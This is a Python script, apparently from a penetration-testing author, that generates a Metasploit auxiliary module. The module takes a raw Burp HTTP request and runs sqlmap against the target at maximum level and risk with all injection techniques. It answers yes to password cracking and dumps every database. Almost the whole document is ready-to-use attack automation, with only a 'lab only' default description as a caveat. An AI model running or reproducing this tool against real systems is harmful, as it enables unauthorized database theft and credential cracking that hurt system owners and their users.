#!/usr/bin/env python3
"""
msf_rb_generator.py

Generates a Metasploit auxiliary module that will use an existing exploit.txt
in the MSF modules folder (no need to cat it in msfconsole). If the system
exploit.txt is not present, the module falls back to using a writable tmp file
created from RAW_REQUEST.

Author: nu11secur1ty (generator)
"""

from string import Template
import os
import shutil
import sys

# DEFAULT MSF module directory and exploit path - change if your msf install is elsewhere
DEFAULT_MSF_MODULE_DIR = "/usr/share/metasploit-framework/modules/auxiliary/MSF"
DEFAULT_MSF_EXPLOIT_PATH = os.path.join(DEFAULT_MSF_MODULE_DIR, "exploit.txt")
DEFAULT_SQLMAP_PATH = "/home/kali/sqlmap-nu11secur1ty/sqlmap.py"

MODULE_TEMPLATE = Template(r'''##
# $module_file
#
# Author: $author
# Description: $description
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      'Name'        => '$rb_name',
      'Description' => '$description',
      'Author'      => ['$author'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('RAW_REQUEST', [ true, 'Raw HTTP request (from Burp)', '' ]),
        OptString.new('SQLMAP_PATH', [ false, 'Full path to sqlmap.py', '$sqlmap_default' ])
      ]
    )
  end

  def run
    raw_request = datastore['RAW_REQUEST']
    sqlmap_path = datastore['SQLMAP_PATH'] || '$sqlmap_default'

    if raw_request.nil? || raw_request.empty?
      print_error("RAW_REQUEST is empty — will attempt to use system exploit.txt if present.")
    end

    # Prefer system exploit.txt in MSF module dir (no need to cat)
    system_exploit = '$msf_exploit_path'
    use_file = nil

    if File.exist?(system_exploit)
      use_file = system_exploit
      print_good("Using existing exploit file: #{use_file}")
    else
      # fallback: write to user-writable home dir
      exploit_dir = File.join(Dir.home, ".msf_exploits")
      Dir.mkdir(exploit_dir) unless Dir.exist?(exploit_dir)
      timestamp = Time.now.strftime("%Y%m%d%H%M%S")
      tmp_file = File.join(exploit_dir, "exploit_#{timestamp}.txt")

      if raw_request.nil? || raw_request.empty?
        print_error("No RAW_REQUEST provided and no system exploit.txt found — nothing to do.")
        return
      end

      begin
        File.open(tmp_file, "w") { |f| f.write(raw_request) }
        print_good("Saved RAW_REQUEST -> #{tmp_file}")
        use_file = tmp_file
      rescue Errno::EACCES => e
        print_error("Cannot write temp exploit file: #{e}")
        return
      rescue => e
        print_error("Failed to save temp request: #{e}")
        return
      end
    end

    unless File.exist?(sqlmap_path)
      print_error("sqlmap.py not found at #{sqlmap_path}. Set SQLMAP_PATH option to correct path.")
      # do not delete the temp file so user can inspect
      return
    end

    sqlmap_cmd = [
      "python3",
      sqlmap_path,
      "-r", use_file,
      "--no-cast",
      "--no-escape",
      "--dbms=mysql",
      "--time-sec=11",
      "--random-agent",
      "--level=5",
      "--risk=3",
      "--batch",
      "--flush-session",
      "--technique=TBEUSQ",
      "--union-char=UCHAR",
      '--answers="crack=Y,dict=Y,continue=Y,quit=N"',
      "--dump-all"
    ].join(" ")

    print_status("Executing sqlmap: #{sqlmap_cmd}")
    begin
      system(sqlmap_cmd)
      print_good("sqlmap finished (check output above)")
    rescue => e
      print_error("Failed to execute sqlmap: #{e}")
    ensure
      # delete tmp file if we created it
      if use_file != system_exploit
        begin
          File.delete(use_file) if File.exist?(use_file)
          print_status("Deleted temporary file #{use_file}")
        rescue => e
          print_warning("Could not delete temporary file: #{e}")
        end
      end
    end
  end
end
''')

def ensure_rb(fname):
    f = fname.strip()
    if not f.lower().endswith('.rb'):
        f = f + '.rb'
    return os.path.basename(f)

def write_file(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as fh:
            fh.write(data)
        return True
    except Exception as e:
        print(f"[!] Failed to write {path}: {e}")
        return False

def generate(output_file, rb_name, author, description, sqlmap_default, raw_request, msf_dir=None):
    module_file = ensure_rb(output_file)
    rb_basename = os.path.splitext(module_file)[0]
    rb_name_final = rb_name or rb_basename

    content = MODULE_TEMPLATE.substitute(
        module_file=module_file,
        rb_name=rb_name_final,
        author=author,
        description=description,
        sqlmap_default=sqlmap_default,
        msf_exploit_path=DEFAULT_MSF_EXPLOIT_PATH
    )

    # write to current dir
    out_rb = os.path.join(os.getcwd(), module_file)
    out_exploit = os.path.join(os.getcwd(), 'exploit.txt')

    if not write_file(out_rb, content):
        return
    if not write_file(out_exploit, raw_request):
        return

    print(f"[+] Wrote module: {out_rb}")
    print(f"[+] Wrote exploit.txt: {out_exploit}")

    # If MSF dir requested, try to copy both files into it
    if msf_dir:
        if not os.path.isdir(msf_dir):
            print(f"[!] MSF dir does not exist: {msf_dir}")
            return
        try:
            # Copy exploit.txt and .rb into msf dir
            dest_rb = os.path.join(msf_dir, module_file)
            dest_exploit = os.path.join(msf_dir, 'exploit.txt')
            shutil.copy2(out_rb, dest_rb)
            shutil.copy2(out_exploit, dest_exploit)
            print(f"[+] Copied {module_file} and exploit.txt to {msf_dir}")
            print("[*] If copying failed due to permissions in the past, run the generator with sudo or copy manually:")
            print(f"    sudo cp {out_rb} {msf_dir}")
            print(f"    sudo cp {out_exploit} {msf_dir}")
        except PermissionError:
            print("[!] Permission denied when copying to MSF dir. Try running generator with sudo or copy files manually.")
        except Exception as e:
            print(f"[!] Failed to copy to MSF dir: {e}")

def main():
    print("=== MSF .rb Generator (use system exploit.txt if present) ===")
    output_file = input("Enter output .rb filename (e.g., sacco_auto_sqlmap.rb): ").strip()
    if not output_file:
        print("[!] No filename provided"); sys.exit(1)
    output_file = ensure_rb(output_file)

    rb_name = input("Enter module Name (shown in module) [optional]: ").strip()
    author = input("Author name [default: nu11secur1ty]: ").strip() or "nu11secur1ty"
    description = input("Module description: ").strip() or "Save RAW_REQUEST and run sqlmap automatically (lab only)."
    sqlmap_default = input(f"SQLMAP_PATH default [{DEFAULT_SQLMAP_PATH}]: ").strip() or DEFAULT_SQLMAP_PATH

    print("\nPaste full Burp request (headers, blank line, body). End with a line containing only END.")
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip() == "END":
            break
        lines.append(line)
    raw_request = '\n'.join(lines)

    print("\nOptional: enter MSF module dir to copy files into (system path requires sudo). Leave blank to skip.")
    msf_dir = input(f"MSF module dir [{DEFAULT_MSF_MODULE_DIR}]: ").strip()
    if msf_dir == '':
        msf_dir = None

    generate(output_file, rb_name, author, description, sqlmap_default, raw_request, msf_dir)

if __name__ == '__main__':
    main()
